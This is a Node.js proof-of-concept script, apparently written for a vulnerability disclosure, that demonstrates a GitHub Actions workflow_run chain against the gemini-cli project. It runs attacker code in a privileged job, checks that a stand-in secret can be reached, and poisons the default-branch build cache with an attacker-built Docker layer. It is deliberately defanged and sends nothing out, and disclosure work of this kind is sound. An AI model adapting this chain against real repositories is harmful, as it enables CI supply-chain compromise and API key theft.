// Benign proof-of-concept payload for the gemini-cli workflow_run artifact-poisoning
// chain. RUNS ONLY IN YOUR OWN LAB REPOS. It prints canaries to the Actions log and
// transmits NOTHING anywhere. It never contacts google-gemini/gemini-cli.
//
// Three modes, invoked by the attacker-controlled package.json scripts that the
// privileged `Chained` job executes after checking out this (attacker) repo:
//   build  -> proves attacker-defined code executes in the privileged job (ACE)
//   exfil  -> proves the secret (FAKE_SECRET, mirroring GEMINI_API_KEY) is reachable
//   poison -> proves the attacker can write a layer into the DEFAULT-BRANCH gha cache
'use strict';
const { execSync } = require('child_process');
const fs = require('fs');
const mode = process.argv[2];

function notice(s) { console.log(`::notice::${s}`); }
function warn(s)   { console.log(`::warning::${s}`); }

if (mode === 'build') {
  // (1) Arbitrary code execution: this line only prints because the privileged
  // workflow_run job checked out the attacker repo and ran its "build" script.
  notice('PoC-ACE :: attacker-defined build script executed inside the privileged workflow_run job');
}

if (mode === 'exfil') {
  // (2) Secret disclosure: in the real workflow this env var is GEMINI_API_KEY.
  // We print only its length and a short hash — the secret itself is never shown
  // or transmitted. Its mere reachability by attacker code is the finding.
  const s = process.env.FAKE_SECRET || '';
  if (s) {
    const crypto = require('crypto');
    const h = crypto.createHash('sha256').update(s).digest('hex').slice(0, 12);
    notice(`PoC-SECRET-REACHABLE :: FAKE_SECRET reachable by attacker code (len=${s.length}, sha256_prefix=${h}); transmitted NOWHERE. In prod this is GEMINI_API_KEY.`);
  } else {
    warn('PoC-SECRET-ABSENT :: FAKE_SECRET was not in this step env (check the chained.yml env: block)');
  }
}

if (mode === 'poison') {
  // (3) Cache poisoning. The attacker has ACE in a job whose GITHUB_REF is the
  // default branch (workflow_run context), so a gha cache written here lands in
  // the DEFAULT-BRANCH scope, readable by every later build (incl. trusted ones).
  // We build the SAME "sandbox" Dockerfile the legit build uses, under a fixed
  // cache scope, and record the layer's build-time provenance. A later trusted
  // build (legit-build.yml) with the identical instruction + scope will restore
  // THIS layer rather than rebuilding -> matching provenance proves it served
  // an attacker-produced layer.
  try {
    fs.writeFileSync('Dockerfile.shared',
      'FROM alpine:3.20\nRUN echo "built-at-$(date +%s%N)-$RANDOM" > /BUILD_PROVENANCE\n');
    execSync(
      'docker buildx build -f Dockerfile.shared --cache-to type=gha,mode=max,scope=sandbox --cache-from type=gha,scope=sandbox -t poc:attacker --load .',
      { stdio: 'inherit' });
    const prov = execSync('docker run --rm poc:attacker cat /BUILD_PROVENANCE').toString().trim();
    notice(`PoC-CACHE-WRITTEN :: attacker layer provenance="${prov}" cached under scope=sandbox (default-branch scope in workflow_run). Run "Legit Build (victim)" next and compare its LEGIT-BUILD-PROVENANCE.`);
  } catch (e) {
    warn('PoC-CACHE-STEP-FAILED :: ' + (e && e.message));
  }
}
